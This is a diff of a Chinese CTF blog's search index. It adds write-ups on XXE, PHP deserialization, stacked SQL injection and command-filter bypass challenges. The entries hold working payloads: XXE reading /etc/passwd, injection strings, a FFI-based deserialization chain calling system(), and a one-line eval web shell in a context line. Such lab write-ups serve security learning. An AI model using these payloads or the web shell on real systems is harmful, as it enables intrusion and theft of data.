@@ -554,8 +554,8 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 ]]></content>
   </entry>
   <entry>
-    <title>命令执行easy bypass</title>
-    <url>/2022/12/01/hhy/</url>
+    <title>easy bypass</title>
+    <url>/2022/12/24/hhy/</url>
     <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$comm1 = $_GET[&#x27;comm1&#x27;];</span><br><span class="line">$comm2 = $_GET[&#x27;comm2&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $comm1))</span><br><span class="line">    $comm1 = &quot;&quot;;</span><br><span class="line">if(preg_match(&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;, $comm2))</span><br><span class="line">    $comm2 = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">$flag = &quot;#flag in /flag&quot;;</span><br><span class="line"></span><br><span class="line">$comm1 = &#x27;&quot;&#x27; . $comm1 . &#x27;&quot;&#x27;;</span><br><span class="line">$comm2 = &#x27;&quot;&#x27; . $comm2 . &#x27;&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">$cmd = &quot;file $comm1 $comm2&quot;;</span><br><span class="line">system($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>1.因为最开始过滤了cat</p>
@@ -568,7 +568,7 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 <p>file只能返回文件格式</p>
 <p>构造</p>
 <p>&#x2F;?comm1&#x3D;index.php”;tac &#x2F;fla?;”&amp;comm2&#x3D;1</p>
-<p><img src="/2022/12/01/hhy/result.jpg" alt="题图"></p>
+<p><img src="/2022/12/24/hhy/result.jpg" alt="题图"></p>
 ]]></content>
   </entry>
   <entry>
@@ -787,6 +787,140 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%d0%99%93%9e%98&quot;).&quot;?&gt;&quot;;</span><br><span class="line">$a=new Error($str,1);$b=new Error($str,2);</span><br><span class="line">$c = new SYCLOVER();</span><br><span class="line">$c-&gt;syc = $a;</span><br><span class="line">$c-&gt;lover = $b;</span><br><span class="line">echo urlencode(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/12/14/wu/3.jpg" alt="题图"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>xml，Fake XML cookbook</title>
+    <url>/2022/12/23/wufa/</url>
+    <content><![CDATA[<p>xxe漏洞触发的点 </p>
+<p>可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
+<p> XML被设计为传输和存储数据，重点是数据的内容。</p>
+<p> HTML被设计用来显示数据，重点是数据的外观。</p>
+<p>xml应该有关闭标签</p>
+<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>使用admin登录</p>
+<p>不行</p>
+<p>抓包</p>
+<p><img src="/2022/12/23/wufa/1.jpg" alt="进程图"></p>
+<p>根据提示想到xml注入</p>
+<p>使用file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd命令查看配置文件</p>
+<?xml version="1.0" encoding="utf-8"? >
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+![进程图](wufa/2.jpg)
+
+发现flag位置
+
+读取flag
+
+<?xml version="1.0" encoding="utf-8"? >
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+![进程图](wufa/3.jpg)
+]]></content>
+  </entry>
+  <entry>
+    <title>NiZhuanSiWei</title>
+    <url>/2022/12/20/wufaping/</url>
+    <content><![CDATA[<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>1.源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2.第一层绕过</p>
+<p>观察到text应该等于welcome to the zjctf</p>
+<p>使用伪协议</p>
+<p>data写入</p>
+<p>&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
+<p>3.观察到有文件包含</p>
+<p>使用php:&#x2F;&#x2F;filter&#x2F;读一下useless.php</p>
+<p>&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>
+<p>获得源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"> </span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>有file_get_contents，再结合会ehco password 反序列化后的内容</p>
+<p>则可以把file_get_contents里面的设为flag.php</p>
+<p>4.进行序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file=&quot;flag.php&quot;;</span><br><span class="line">    public function __tostring()&#123;</span><br><span class="line">        if(isset($this-&gt;file))&#123;</span><br><span class="line">            echo file_get_contents($this-&gt;file);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Flag;</span><br><span class="line">print_r(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/20/wufaping/1.jpg" alt="进程图"></p>
+<p>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+<p>最后拼接</p>
+<p>&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+<p>得到flag</p>
+<p><img src="/2022/12/20/wufaping/2.jpg" alt="进程图"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>EasySQL</title>
+    <url>/2022/12/20/wufapingjia/</url>
+    <content><![CDATA[<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>information_schema.tables都被过滤</p>
+<p>报错注入，时间盲注也被过滤</p>
+<p>尝试堆查询注入</p>
+<p>发现flag也被过滤</p>
+<p>通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||</p>
+<p>使用||如果第一个存在则不会查询第二个  相当于内置了一个select</p>
+<p>在 查看数据表中有一个指向flag，所以应该查的是flag</p>
+<p>查资料得到  set sql_mode&#x3D;pipes_as_concat可以将||的作用由or变为拼接字符串</p>
+<p>可以把输入的内容跟flag from xxx拼接起来</p>
+<p>在后面加上select 1</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?query=1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>Ezsql</title>
+    <url>/2022/12/26/%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h1><p>SQL查询，过滤了：union、sleep、’、”、or、-、benchmark</p>
+<p>order by测试字段数，发现当order by 2时返回正常order by 3返回没有这个字段，确定为两个字段，一个为uniqueid另一个应该就是flag</p>
+<p>输入id判断登录，即可，尝试万能密码登录：1 || 1&#x3D;1 limit 0,1<br>返回flag</p>
+<p><img src="/2022/12/26/%E7%AC%94%E8%AE%B0/13.jpg" alt="题图"></p>
+<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>1.输入1，看到有回显<code>Array ( [0] =&gt; 1 )</code>，输入<code>1#</code>有回显，但是输入<code>1&#39;</code>和<code>1&#39;#</code>都没有回显，连报错都没有，就说明不能使用报错注入，而且<code>&quot;</code>被过滤了</p>
+<p>2.而且输入<code>and,or,union,if,order,from,sleep等</code>都会显示Nonono，说明都被过滤了，不能使用联合注入、时间盲注、布尔盲注</p>
+<p>3.最后发现可以使用堆叠注入</p>
+<p>先使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show databases#</span><br><span class="line"></span><br><span class="line">回显</span><br><span class="line">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )</span><br></pre></td></tr></table></figure>
+
+<p>再使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show tables#</span><br><span class="line"></span><br><span class="line">回显</span><br><span class="line">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</span><br></pre></td></tr></table></figure>
+
+<p>这就说明有一个flag表，但from没法使用不能打开表中的列，而且hendler也被过滤</p>
+<p>4.然后wp上有一个知识点，如果打开<code>set sql_mode=pipes_as_concat</code>模式，则||运算符用作字符串连接</p>
+<p>比如一般select 6||1会返回1，但如果打开这个模式，就会返回61，因为直接被当作字符串来连接起来了</p>
+<p>5.然后wp上猜测的是这个原语句是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql=&quot;select post[&#x27;query&#x27;] || flag from Flag&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>所以就会有两种方法</p>
+<p>方法一payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*,1</span><br><span class="line"></span><br><span class="line">这就相当于执行了</span><br><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure>
+
+<p>方法二payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;set sql_mode=pipes_as_concat;select 1</span><br><span class="line"></span><br><span class="line">这就相当于执行了</span><br><span class="line">select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag;</span><br><span class="line">因为打开了这个模式，所以1||flag会被当成1和flag，而不会进行运算</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>Nextphp</title>
+    <url>/2022/12/26/nextphp/</url>
+    <content><![CDATA[<h1 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h1><p>1.源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;a&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看phpinfo（）</p>
+<p>发现很多禁用的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disable_functions	set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl	</span><br></pre></td></tr></table></figure>
+
+<p>使用file_put_contents()写入一个a.php</p>
+<p>yijian连接获取源代码preload.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;print_r&#x27;,</span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;1&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    //可以进行函数执行</span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        //array_merge把两个数组合并为一个数组</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        </span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">	//结果输出</span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        //如果$key为ret，就可以输出函数执行返回的结果</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>观察到有反序列化，构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;FFI::cdef&#x27;,</span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;int system(char *command);&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    //可以进行函数执行</span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        //array_merge把两个数组合并为一个数组</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    //结果输出</span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        //如果$key为ret，就可以输出函数执行返回的结果</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line">/*</span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入<code>$a</code>之后，进行unserialize反序列化，会找__unserialize()函数，然后执行run()函数，然后data[‘ret’]&#x3D;FFI::cdef(‘int system(char *command);’)，然后使用从C库中加载的system函数，然后return，最后执行system(‘cat &#x2F;flag | tee a.txt’)，使用tee保存cat &#x2F;flag的结果</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#x27;)-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;cat /flag | tee a.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
 </search>
